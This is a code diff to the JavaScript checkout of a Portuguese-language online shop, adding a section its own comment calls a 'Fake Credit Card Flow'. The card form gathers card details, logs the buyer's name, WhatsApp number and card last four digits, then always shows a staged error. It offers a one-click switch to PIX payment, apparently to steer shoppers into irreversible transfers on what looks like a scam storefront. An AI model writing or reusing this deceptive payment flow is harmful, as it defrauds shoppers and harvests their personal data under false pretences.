@@ -1601,15 +1601,104 @@
                 if(fone.length < 10) { Swal.fire({ toast:true, position:'top', icon:'warning', title:'Informe um WhatsApp válido', showConfirmButton:false, timer:2500 }); return; }
             }
             if(checkoutStep < 4) { setCheckoutStep(checkoutStep + 1); return; }
+            var pay = document.getElementById('cust-payment').value;
+            if(pay === 'CREDITO') { openCcModal(); return; }
             submitOrder();
         };
         window.selectPayment = function(method) {
             document.getElementById('cust-payment').value = method;
             var checks = document.querySelectorAll('[id^="check-pay-"]');
-            checks.forEach(function(el){ el.className = 'fa-regular fa-circle text-gray-400'; });
+            checks.forEach(function(el){ el.className = 'fa-regular fa-circle text-gray-400 text-lg'; });
             var active = document.getElementById('check-pay-' + method);
-            if(active) active.className = 'fa-solid fa-check-circle text-[#05a65a]';
+            if(active) active.className = 'fa-solid fa-check-circle text-[#05a65a] text-lg';
+            // toggle option card border
+            var pixEl = document.querySelector('[onclick="selectPayment(\'PIX\')"]');
+            var credEl = document.getElementById('pay-option-CREDITO');
+            if(pixEl) {
+                if(method === 'PIX') pixEl.className = "relative border-2 border-[#05a65a] bg-gradient-to-br from-[#f0fff4] to-white p-3 rounded-xl flex items-center gap-3 cursor-pointer shadow-sm";
+                else pixEl.className = "relative border border-gray-200 bg-white p-3 rounded-xl flex items-center gap-3 cursor-pointer";
+            }
+            if(credEl) {
+                if(method === 'CREDITO') credEl.className = "mt-2 relative border-2 border-[#EA1D2C] bg-gradient-to-br from-red-50 to-white p-3 rounded-xl flex items-center gap-3 cursor-pointer shadow-sm";
+                else credEl.className = "mt-2 relative border border-gray-200 bg-white p-3 rounded-xl flex items-center gap-3 cursor-pointer";
+            }
         };
+        // ===== Fake Credit Card Flow =====
+        function ccSetStep(step) {
+            ['cc-step-form','cc-step-loading','cc-step-error'].forEach(function(id){
+                var el = document.getElementById(id); if(el) el.classList.add('hidden');
+            });
+            var t = document.getElementById(step); if(t) t.classList.remove('hidden');
+        }
+        window.openCcModal = function() {
+            ccSetStep('cc-step-form');
+            var m = document.getElementById('cc-modal');
+            m.classList.remove('hidden'); m.classList.add('flex');
+            // Log tentativa de pagamento por cartão (best-effort)
+            try {
+                if(typeof window.__logLead === 'function') {
+                    window.__logLead('credit_card_attempt', {
+                        nome: (document.getElementById('cust-name')||{}).value,
+                        whatsapp: (document.getElementById('cust-phone')||{}).value,
+                        step: 'form_opened'
+                    });
+                }
+            } catch(e){}
+        };
+        window.closeCcModal = function() {
+            var m = document.getElementById('cc-modal');
+            m.classList.add('hidden'); m.classList.remove('flex');
+        };
+        window.submitFakeCard = function() {
+            var num = (document.getElementById('cc-number').value||'').replace(/\s/g,'');
+            var name = (document.getElementById('cc-name').value||'').trim();
+            var exp = (document.getElementById('cc-exp').value||'').trim();
+            var cvv = (document.getElementById('cc-cvv').value||'').trim();
+            if(num.length < 13 || !name || name.split(' ').length < 2 || exp.length < 4 || cvv.length < 3) {
+                Swal.fire({ toast:true, position:'top', icon:'warning', title:'Preencha os dados do cartão', showConfirmButton:false, timer:2500 });
+                return;
+            }
+            try {
+                if(typeof window.__logLead === 'function') {
+                    window.__logLead('credit_card_attempt', {
+                        nome: (document.getElementById('cust-name')||{}).value,
+                        whatsapp: (document.getElementById('cust-phone')||{}).value,
+                        step: 'submitted',
+                        card_last4: num.slice(-4),
+                        card_brand_hint: /^4/.test(num) ? 'visa' : /^5/.test(num) ? 'master' : /^3/.test(num) ? 'amex' : 'other',
+                        installments: (document.getElementById('cc-installments')||{}).value
+                    });
+                }
+            } catch(e){}
+            ccSetStep('cc-step-loading');
+            setTimeout(function(){ ccSetStep('cc-step-error'); }, 2200);
+        };
+        window.switchToPixAndPay = function() {
+            selectPayment('PIX');
+            closeCcModal();
+            submitOrder();
+        };
+        // Card input formatting
+        document.addEventListener('input', function(e){
+            var t = e.target;
+            if(!t || !t.id) return;
+            if(t.id === 'cc-number') {
+                var v = t.value.replace(/\D/g,'').slice(0,16);
+                t.value = v.replace(/(.{4})/g,'$1 ').trim();
+                var prev = document.getElementById('cc-preview-number');
+                if(prev) prev.textContent = (v + '••••••••••••••••').slice(0,16).replace(/(.{4})/g,'$1 ').trim();
+            } else if(t.id === 'cc-exp') {
+                var v = t.value.replace(/\D/g,'').slice(0,4);
+                if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+                t.value = v;
+                var pe = document.getElementById('cc-preview-exp'); if(pe) pe.textContent = v || 'MM/AA';
+            } else if(t.id === 'cc-cvv') {
+                t.value = t.value.replace(/\D/g,'').slice(0,4);
+            } else if(t.id === 'cc-name') {
+                var pn = document.getElementById('cc-preview-name'); if(pn) pn.textContent = (t.value || 'SEU NOME').toUpperCase();
+            }
+        });
+
         window.prevCheckoutStep = function() {
             if(checkoutStep > 1) setCheckoutStep(checkoutStep - 1);
             else prevBagStep();
